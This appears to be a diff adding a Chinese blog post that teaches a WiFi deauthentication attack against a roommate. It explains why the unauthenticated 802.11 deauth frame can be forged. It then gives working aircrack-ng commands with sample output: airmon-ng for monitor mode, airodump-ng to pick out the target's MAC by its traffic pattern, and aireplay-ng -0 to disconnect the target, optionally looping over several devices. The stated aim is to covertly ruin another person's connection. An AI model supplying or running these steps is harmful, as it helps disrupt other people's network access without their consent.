@@ -1,0 +1,74 @@
+[mixin] @std/vue
+
+[h2] [title]
+
+[title]: 如何把你的室友踢出 Wifi
+
+[quote].warn 注意：使用本方法比较掉 karma，建议尽量以沟通为主
+
+[h3] 原理
+
+  IEEE 802.11 协议设计了一个 Deauthentication 帧用于让通信一方要求另一方断开连接。然而这个帧既没有加密也无需签名，因此只要知道目标双方MAC地址即可伪造一个帧用于断开连接。实测 Android 9 和 Windows 10 在收到这个帧后会断开 Wifi 并立即尝试重新连接，大约 1.5 秒后连接恢复。在此期间不会对用户有任何通知。偶尔发送几个这样的帧可以极大降低室友深夜联机网游的体验，从而促使他保持良好作息。
+
+  如果持续发送这个帧，可以阻止目标进行连接。系统会尝试连接其它 AP。详情可见 [Wiki]。
+
+[Wiki]: [link](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack) Wiki
+
+[h3] 准备
+
+  按照维基的推荐，[aircrack-ng] 可以用来进行攻击。Arch 官方库里就有这个包，直接一键安装。不过这套软件需要 root 权限，如果害怕被无间道也可以考虑 [USB版Kali]，里面自带了这款软件。
+
+[aircrack-ng]: [link](https://github.com/aircrack-ng/aircrack-ng) aircrack-ng
+[USB版Kali]: [link](https://www.kali.org/docs/usb/kali-linux-live-usb-install/) USB 版 Kali
+
+[h3] 瞄准
+
+  攻击前我们需要找到目标的 MAC 地址。首先使用 [code](airmon-ng start &lt;interface&gt;) 将网卡设置成 Monitor 模式以接受无线网络中所有的数据（默认情况下操作系统会根据 MAC 地址进行过滤，只接受发送给自己的数据）。成功后之后 interface 的名字会发生变化，一般是在原有名字的后面增加一个 "mon" 后缀。如果你像我一样使用傻屌的 systemd 的话，这个名字看起来可能长这样 [code](wlp0s20f3mon)。
+
+  之后可以使用 [code](airodump-ng) 监测附近的 Wifi：
+
+[code]>>>
+# airodump-ng wlp0s20f3mon
+ CH  7 ][ Elapsed: 6 s ][ 2020-03-02 19:15
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 50:**:**:**:**:A1  -54       17        9    0   1  130   WPA2 CCMP   PSK  **********
+ 50:**:**:**:**:DB  -58       12       42    2  11  130   WPA2 CCMP   PSK  **********
+ 60:**:**:**:**:20  -68        9        2    0  11  195   WPA2 CCMP   PSK  **********
+ 50:**:**:**:**:D1  -67       13        9    0   1  130   WPA2 CCMP   PSK  **********
+ 28:**:**:**:**:37  -72        7        0    0   1  130   WPA2 CCMP   PSK  **********
+ C8:**:**:**:**:A1  -70       10        0    0   7  195   WPA2 CCMP   PSK  **********
+ 78:**:**:**:**:90  -74        4        0    0  11  270   WPA2 CCMP   PSK  **********
+ 50:**:**:**:**:67  -72       14        0    0   2  130   WPA2 CCMP   PSK  **********
+ 50:**:**:**:**:C3  -73       11        0    0   1  130   WPA2 CCMP   PSK  **********
+ 60:**:**:**:**:01  -75        4        0    0   6  540   WPA2 CCMP   PSK  **********
+ 24:**:**:**:**:59  -76        4        0    0   5  360   WPA2 CCMP   PSK  **********
+ 04:**:**:**:**:50  -73        5        0    0  10  195   WPA2 CCMP   PSK  **********
+ 74:**:**:**:**:39  -75        6        0    0   3  720   WPA2 CCMP   PSK  **********
+ 50:**:**:**:**:AF  -76        6        0    0   1  130   WPA2 CCMP   PSK  **********
+ 78:**:**:**:**:B0  -75        1        2    0   4  195   WPA2 CCMP   PSK  **********
+ 2C:**:**:**:**:78  -79        3        0    0   1  360   WPA2 CCMP   PSK  **********
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ (not associated)   DA:**:**:**:**:9D  -53    0 - 5      1        2
+ 50:**:**:**:**:A1  98:**:**:**:**:73  -61    0 - 0e     0        2
+ 50:**:**:**:**:A1  88:**:**:**:**:04  -68    0e-24      0       10
+ 50:**:**:**:**:DB  68:**:**:**:**:7C   -1    0e- 0      0        9
+ 50:**:**:**:**:DB  70:**:**:**:**:7F  -46    0e- 1e  1456       64
+<<<
+
+  如上 [code](ESSID) 就是通常所见的 AP 名称，如果有多个重名 Wifi 的话可以利用 [code](PWR) 辅助判断，值越大的（注意是负数）信号越强，意味着离你越近。记录下对应的 [code](BSSID) 和 [code](CH)，然后再运行 [code](airodump-ng wlp0s20f3mon -d &lt;BSSID&gt; -c &lt;CH&gt;)。这一步不能省，至少要指定 [code](-c)，因为默认情况下 [code](airodump) 会处于 Hopping 状态，也即不断切换 channel。而我们下一步需要保证 interface 处于和目标相同的 channel 里。再次运行后界面与之前类似，但是上面一栏只有我们的目标 AP 一行了，而下面会列出连接到它的用户，Station 一栏就是目标 MAC 地址。通过观察 Frames 可以定位到我们的目标，对于大多数网游来说，这个 Frame 应该会缓慢但是不断地增长，如果间歇性突然增长的，可能是浏览网页，而一直大量增长的可能是在下载或者看视频。如果实在拿捏不准可以都记下来，一会用个循环全部干掉。
+
+[h3] 攻击
+
+  确认了目标及 AP 的 MAC 地址之后就可以进行攻击了，命令非常简单：
+
+[code]>>>
+# aireplay-ng -0 1 -a &lt;BSSID&gt; -c &lt;Target MAC&gt; wlp0s20f3mon
+19:07:43  Waiting for beacon frame (BSSID: 50:**:**:**:**:A1) on channel 1
+19:07:44  Sending 64 directed DeAuth (code 7). STMAC: [5C:**:**:**:**:B7] [54|47 ACKs]
+<<<
+
+  如果成功了的话，你就可以听到室友开始口吐芬芳了~
